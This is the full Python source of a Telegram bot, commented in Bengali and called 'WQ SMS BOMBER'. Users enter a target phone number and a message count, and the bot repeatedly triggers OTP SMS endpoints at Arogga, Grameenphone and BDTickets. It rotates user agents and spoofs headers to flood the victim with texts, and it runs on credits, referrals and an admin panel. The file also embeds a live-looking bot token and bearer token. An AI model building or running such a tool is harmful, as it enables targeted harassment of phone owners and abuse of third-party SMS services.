import os
import random
import threading
import time
from flask import Flask
import requests
import telebot
from telebot.types import KeyboardButton, ReplyKeyboardMarkup

# আপনার টেলিগ্রাম বট টোকেন
TOKEN = "9170879282:AAESbi5FBohsHoVvrs4t-kblWKfULticg4s"
bot = telebot.TeleBot(TOKEN)

# ── আপনার অ্যাডমিন চ্যাট আইডি ──
ADMIN_CHAT_ID = 8087857994

# ডাটাবেজ (মেমোরিতে থাকবে)
user_credits = {}  # {chat_id: credit_amount}
user_hits = {}  # {chat_id: total_bombing_hits}

# রেন্ডারের পোর্ট রিকোয়ারমেন্ট পূরণের জন্য ফ্লাস্ক ওয়েব সার্ভার
app = Flask(__name__)


@app.route("/")
def home():
  return "Oustad Bot is Live and Running!"


# ইউজার এজেন্ট পুল
USER_AGENT_DATA = {
    "user_agent": [
        (
            "Mozilla/5.0 (Linux; Android 10; SM-T595"
            " Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko)"
            " Chrome/156.0.8078.47 Safari/537.36"
        ),
        (
            "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36"
            " (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36"
        ),
        (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            " (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ),
        (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X)"
            " AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2"
            " Mobile/15E148 Safari/604.1"
        ),
    ]
}


class Bomber:

  def __init__(self, user_mobile, number_of_messege, chat_id):
    self.user_mobile = user_mobile
    self.number_of_messege = number_of_messege
    self.chat_id = chat_id

  def getUserAgent(self):
    return random.choice(USER_AGENT_DATA["user_agent"])

  def aroggo(self):
    url = "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.0.0&os=Android&osv=13"
    headers = {
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://www.arogga.com",
        "referer": "https://www.arogga.com/",
        "user-agent": self.getUserAgent(),
        "x-requested-with": "mark.via.gp",
    }
    payload = {"mobile": self.user_mobile, "fcmToken": "", "referral": ""}
    try:
      r = requests.post(url, data=payload, headers=headers, timeout=5)
      if r.status_code == 200:
        return True
    except:
      pass
    return False

  def grameenphone(self):
    url = "https://webloginda.grameenphone.com/backend/api/v1/otp"
    headers = {
        "Host": "webloginda.grameenphone.com",
        "User-Agent": self.getUserAgent(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.grameenphone.com",
        "X-Requested-With": "mark.via.gp",
        "Referer": "https://www.grameenphone.com/",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    }
    payload = {"msisdn": self.user_mobile, "source": "gp_web"}
    try:
      r = requests.post(url, data=payload, headers=headers, timeout=5)
      if r.status_code == 200:
        res_json = r.json()
        if res_json.get("status") == True:
          return True
    except:
      pass
    return False

  def bdtickets(self):
    url = "https://apiv1.bdtickets.com/api/v1/auth/otp/send"
    headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "x-platform": "web",
        "x-channel": "direct",
        "origin": "https://bdtickets.com",
        "referer": "https://bdtickets.com/",
        "user-agent": self.getUserAgent(),
        "x-requested-with": "mark.via.gp",
        "authorization": (
            "Bearer"
            " eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uX2lkIjoiYTNiZWE3OTAtZjcxOC00NjU4LTg5OTctYzM1MzRhMmEzYzNhIiwiaXNfYW5vbnltb3VzIjp0cnVlLCJ0b2tlbl92ZXJzaW9uIjoxLCJyb2xlcyI6W10sInBlcm1pc3Npb25zIjpbXSwianRpIjoiNWNkNjE3NTMtMjBlYS00YzU0LWExMjctMzBjYzU1YjBjOTg1IiwiaWF0IjoxNzkzNjQ2OTEzLCJleHAiOjE3OTQyNTE3MTN9.Rn2jSWG5MWA5LPI7DDAyvb0tFy37QrSg9aUkKm_oI3k"
        ),
    }
    phone_num = self.user_mobile
    if not phone_num.startswith("+88"):
      if phone_num.startswith("88"):
        phone_num = "+" + phone_num
      else:
        phone_num = "+88" + phone_num

    payload = {"phone": phone_num}
    try:
      r = requests.post(url, json=payload, headers=headers, timeout=5)
      if r.status_code == 200:
        res_json = r.json()
        if res_json.get("success") == True:
          return True
    except:
      pass
    return False



  
  

  












  def start(self):
    current_credits = user_credits.get(self.chat_id, 0)
    if current_credits < 1:
      bot.send_message(
          self.chat_id,
          "❌ **পর্যাপ্ত ক্রেডিট নেই!**\nবম্বিং শুরু করতে কমপক্ষে **১ ক্রেডিট**"
          " প্রয়োজন।\nদয়া করে `/refer` কমান্ড ব্যবহার করে রেফার করুন অথবা অ্যাডমিনের"
          " কাছ থেকে ক্রেডিট রিচার্জ করুন।",
          parse_mode="Markdown",
      )
      return

    # ১ ক্রেডিট কাটা হচ্ছে এবং হিট কাউন্ট ১ বাড়নো হচ্ছে
    user_credits[self.chat_id] -= 1
    if self.chat_id in user_hits:
      user_hits[self.chat_id] += 1
    else:
      user_hits[self.chat_id] = 1

    counter = 0
    bot.send_message(
        self.chat_id,
        f"🚀 **Target:** `{self.user_mobile}`\n📊 **Count:**"
        f" `{self.number_of_messege}`\n⚡ **বম্বিং কার্যক্রম শুরু হয়েছে...**\n💳"
        f" কেটে নেওয়া হয়েছে: `1` ক্রেডিট (বাকি: `{user_credits[self.chat_id]}`"
        " ক্রেডিট)",
        parse_mode="Markdown",
    )
    methods = [
        self.aroggo,
        self.grameenphone,
        self.bdtickets,
        
        
        
        
        
    ]

    while counter < self.number_of_messege:
      current_methods = list(methods)
      random.shuffle(current_methods)

      for method in current_methods:
        if counter >= self.number_of_messege:
          break
        try:
          success = method()
          if success:
            counter += 1
            bot.send_message(
                self.chat_id,
                f"[+] OTP sent successfully! [{counter}/{self.number_of_messege}]",
            )
            time.sleep(2.5)
          else:
            time.sleep(1)
        except:
          time.sleep(1)

    bot.send_message(
        self.chat_id,
        f"✅ **টাস্ক সম্পন্ন!**\nTarget: `{self.user_mobile}` সফলভাবে শেষ হয়েছে।",
        parse_mode="Markdown",
    )


# ── অ্যাডমিন কমান্ড: ক্রেডিট দেওয়ার জন্য (/add <chat_id> <amount>) ──
@bot.message_handler(commands=["add"])
def admin_add_credit(message):
  if message.chat.id != ADMIN_CHAT_ID:
    bot.reply_to(message, "❌ আপনার এই কমান্ডটি ব্যবহার করার অনুমতি নেই!")
    return

  parts = message.text.split()
  if len(parts) < 3:
    bot.reply_to(
        message,
        "[-] সঠিক ফরম্যাট দিন: `/add <chat_id> <amount>`",
        parse_mode="Markdown",
    )
    return

  try:
    target_uid = int(parts[1])
    amount = int(parts[2])

    if target_uid in user_credits:
      user_credits[target_uid] += amount
    else:
      user_credits[target_uid] = amount

    bot.reply_to(
        message,
        f"✅ সফলভাবে ইউজার `{target_uid}`-কে `{amount}` ক্রেডিট দেওয়া"
        f" হয়েছে।\nবর্তমান ব্যালেন্স: `{user_credits[target_uid]}` ক্রেডিট।",
        parse_mode="Markdown",
    )

    try:
      bot.send_message(
          target_uid,
          f"🎉 **অভিনন্দন!** অ্যাডমিন আপনার অ্যাকাউন্টে `{amount}` ক্রেডিট"
          f" রিচার্জ করেছেন।\nআপনার বর্তমান মোট ক্রেডিট: `{user_credits[target_uid]}`"
          " টি।",
          parse_mode="Markdown",
      )
    except:
      pass

  except ValueError:
    bot.reply_to(message, "[-] চ্যাট আইডি এবং পরিমাণ সংখ্যায় হতে হবে!")


# ── অ্যাডমিন কমান্ড: ইউজার লিস্ট, ক্রেডিট ও হিট দেখার জন্য (/user) ──
@bot.message_handler(commands=["user"])
def admin_user_stats(message):
  if message.chat.id != ADMIN_CHAT_ID:
    bot.reply_to(message, "❌ আপনার এই কমান্ডটি ব্যবহার করার অনুমতি নেই!")
    return

  if not user_credits:
    bot.reply_to(message, "📊 এই মুহূর্তে কোনো ইউজারের ডাটা নেই।")
    return

  stats_text = (
      "👑 **Oustad Admin Panel - User List & Stats** 👑\n\n"
      f"👥 মোট ইউজার: `{len(user_credits)}` জন\n\n"
  )

  for idx, (uid, creds) in enumerate(user_credits.items(), 1):
    hits = user_hits.get(uid, 0)
    stats_text += (
        f"{idx}. Chat ID: `{uid}` | Credit: `{creds}` টি | Total Hits: `{hits}`"
        " বার\n"
    )

  bot.send_message(message.chat.id, stats_text, parse_mode="Markdown")


# ── রেফারেল লিংক পাওয়ার কমান্ড (/refer) ──
@bot.message_handler(commands=["refer"])
def refer_command(message):
  chat_id = message.chat.id
  bot_info = bot.get_me()
  bot_username = bot_info.username
  refer_link = f"https://t.me/{bot_username}?start={chat_id}"

  text = (
      "👥 **Refer & Earn Program** 👥\n\nআপনার বন্ধুদের এই বটে রেফার করুন! প্রতি"
      " সফল রেফারে আপনি পাবেন **১ ক্রেডিট** করে ফ্রি।\n\n🔗 আপনার রেফারেল"
      f" লিংক:\n`{refer_link}`"
  )
  bot.send_message(message.chat.id, text, parse_mode="Markdown")


# ফিক্সড রিপ্লাই কিবোর্ড
def get_reply_keyboard():
  markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
  btn_bomb = KeyboardButton("🚀 Start Bombing")
  btn_status = KeyboardButton("📊 Bot Status")
  btn_help = KeyboardButton("ℹ️ Help & Info")
  btn_dev = KeyboardButton("👑 Oustad Panel")
  markup.add(btn_bomb, btn_status, btn_help, btn_dev)
  return markup


@bot.message_handler(commands=["start"])
def send_welcome(message):
  chat_id = message.chat.id
  args = message.text.split()

  # নতুন ইউজার হলে সাইন-আপ বোনাস ২ ক্রেডিট দেওয়া
  if chat_id not in user_credits:
    user_credits[chat_id] = 2  # নতুনদের জন্য ২ ক্রেডিট ফ্রি
    if chat_id not in user_hits:
      user_hits[chat_id] = 0

    # রেফারেল চেক (যদি কেউ রেফার লিংক থেকে জয়েন করে)
    if len(args) > 1:
      try:
        referrer_id = int(args[1])
        if referrer_id != chat_id and referrer_id in user_credits:
          user_credits[referrer_id] += 1  # রেফারাকে ১ ক্রেডিট বোনাস
          bot.send_message(
              referrer_id,
              "🎉 **অভিনন্দন!** আপনার রেফারেল লিংকের মাধ্যমে একজন নতুন ইউজার"
              " জয়েন করেছে। আপনি **১ ক্রেডিট** বোনাস পেয়েছেন!",
              parse_mode="Markdown",
          )
      except ValueError:
        pass

  welcome_text = (
      "🔥 *স্বাগতম ওস্তাদ! WQ SMS BOMBER প্যানেলে.*\n\n🎁 নতুন জয়েনিং বোনাস:"
      f" **২ ক্রেডিট ফ্রি!**\n💳 আপনার বর্তমান ক্রেডিট: `{user_credits[chat_id]}`"
      " টি\n\nনিচের ফিক্সড কিবোর্ড থেকে আপনার প্রয়োজনীয় অপশনটি সিলেক্ট করুন:"
  )
  bot.send_message(
      message.chat.id,
      welcome_text,
      reply_markup=get_reply_keyboard(),
      parse_mode="Markdown",
  )


@bot.message_handler(func=lambda message: True)
def handle_text_buttons(message):
  chat_id = message.chat.id
  text = message.text

  if text == "🚀 Start Bombing":
    current_bal = user_credits.get(chat_id, 0)
    msg = bot.send_message(
        chat_id,
        f"💳 আপনার বর্তমান ক্রেডিট: `{current_bal}` টি\n\n📱 অনুগ্রহ করে টার্গেট"
        " মোবাইল নম্বরটি দিন (যেমন: `013XXXXXXXX`):",
        reply_markup=get_reply_keyboard(),
        parse_mode="Markdown",
    )
    bot.register_next_step_handler(msg, process_mobile_step)

  elif text == "📊 Bot Status":
    current_bal = user_credits.get(chat_id, 0)
    hits = user_hits.get(chat_id, 0)
    bot.send_message(
        chat_id,
        (
            f"🟢 **Bot Status:** Online & Active\n💳 **Your Credits:**"
            f" `{current_bal}` টি\n⚡ **Your Total Hits:** `{hits}` বার\n🚀"
            " **APIs Loaded:** Arogga, Grameenphone, Bdtickets, Shopz,"
            " Ghorerbazar\n⚡ **Speed:** High Performance"
        ),
        reply_markup=get_reply_keyboard(),
        parse_mode="Markdown",
    )

  elif text == "ℹ️ Help & Info":
    bot.send_message(
        chat_id,
        (
            "ℹ️ **কীভাবে ব্যবহার করবেন:**\n\n১. `🚀 Start Bombing` বাটনে ক্লিক"
            " করুন।\n২. টার্গেট নম্বর দিন।\n৩. কতটি মেসেজ পাঠাবেন তা লিখুন (প্রতিবার"
            " বম্বিংয়ে মাত্র **১ ক্রেডিট** কাটা হবে)।\n\n🎁 ফ্রি ক্রেডিট পেতে"
            " `/refer` কমান্ড দিয়ে আপনার বন্ধুদের মাঝে লিংক শেয়ার করুন!"
        ),
        reply_markup=get_reply_keyboard(),
        parse_mode="Markdown",
    )

  elif text == "👑 Oustad Panel":
    bot.send_message(
        chat_id,
        (
            "👑 **Developer:**WQ OWNER (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
            " **Hosted on:** None"
        ),
        reply_markup=get_reply_keyboard(),
        parse_mode="Markdown",
    )


def process_mobile_step(message):
  target_mobile = message.text.strip()
  if target_mobile in [
      "🚀 Start Bombing",
      "📊 Bot Status",
      "ℹ️ Help & Info",
      "👑 Oustad Panel",
  ]:
    return

  msg = bot.send_message(
      message.chat.id,
      f"✅ টার্গেট নম্বর: `{target_mobile}`\n\n🔢 এবার কতগুলো মেসেজ পাঠাতে চান তা"
      " সংখ্যায় লিখুন (যেমন: `10` বা `50`):",
      reply_markup=get_reply_keyboard(),
      parse_mode="Markdown",
  )
  bot.register_next_step_handler(msg, process_count_step, target_mobile)


def process_count_step(message, target_mobile):
  try:
    count = int(message.text.strip())
    b = Bomber(target_mobile, count, message.chat.id)
    threading.Thread(target=b.start).start()
  except ValueError:
    bot.send_message(
        message.chat.id,
        "[-] ভুল সংখ্যা দিয়েছেন! দয়া করে সঠিক সংখ্যা লিখুন।",
        reply_markup=get_reply_keyboard(),
    )


def run_telegram_bot():
  bot.infinity_polling()


if __name__ == "__main__":
  threading.Thread(target=run_telegram_bot, daemon=True).start()
  port = int(os.environ.get("PORT", 5000))
  app.run(host="0.0.0.0", port=port)
